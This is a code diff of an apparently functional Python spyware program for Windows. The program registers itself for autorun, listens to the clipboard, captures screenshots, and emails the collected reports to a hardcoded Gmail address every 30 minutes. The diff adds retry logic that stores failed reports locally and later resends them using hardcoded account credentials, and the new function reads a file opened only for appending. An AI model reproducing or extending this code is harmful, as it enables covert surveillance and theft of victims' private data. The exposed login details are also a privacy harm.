@@ -21,7 +21,6 @@ import win32process
 import  shutil
 import logging
 import sys
-
 import page1
 
 autorun.AddToRegistry()
@@ -51,6 +50,26 @@ def check():
             page1.my_page1()
             
 
+def isdataavailable():
+    with open('datafile.txt', 'a') as f:
+        # print(f.read())
+        data = f.read()
+        print(data)
+        if data != '':
+            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+            # # connect to the SMTP server as TLS mode ( for security )
+            server.starttls()
+            # login to the email account
+            server.login('Shalinitiwari1098@gmail.com', 'abcd@1234')
+            # send the actual message
+            server.sendmail('Shalinitiwari1098@gmail.com', 'Anshumankumar7890@gmail.com', str(data))
+            print('email sent successfully')
+            # terminates the session
+            server.quit()
+            f.write('')
+        else:
+            pass
+
 clipboard_data = ''
 
 def clipboard_listener():
@@ -68,6 +87,7 @@ def main_func():
 
     check()
     print('main function started')
+    isdataavailable()
     global clipboard_data
     clipboard_listener()
     SEND_REPORT_EVERY = 1800 # in seconds, 60 means 1 minute and so on
@@ -158,20 +178,25 @@ def main_func():
                 img.add_header('Content-ID', '<{}>'.format(f'C://temp/log{i}.png'))
                 msg.attach(img)
             print('sending email...')
-            # manages a connection to an SMTP server
-            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
-            # # connect to the SMTP server as TLS mode ( for security )
-            server.starttls()
-            # login to the email account
-            server.login(email, password)
-            # send the actual message
-            server.sendmail(email, 'Anshumankumar7890@gmail.com',msg.as_string())
-            print('email sent successfully')
-            # terminates the session
-            server.quit()
-            # os.remove('C://temp/')
-            shutil.rmtree('C://temp')
-            clipboard_data = ''
+            try:
+                
+                # manages a connection to an SMTP server
+                server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+                # # connect to the SMTP server as TLS mode ( for security )
+                server.starttls()
+                # login to the email account
+                server.login(email, password)
+                # send the actual message
+                server.sendmail(email, 'Anshumankumar7890@gmail.com',msg.as_string())
+                print('email sent successfully')
+                # terminates the session
+                server.quit()
+                # os.remove('C://temp/')
+                shutil.rmtree('C://temp')
+                clipboard_data = ''
+            except:
+                with open('datafile.txt', 'a') as f:
+                    f.write(msg.as_string())
         def report(self):
             # if self.log:
                 # if there is something in log, report it
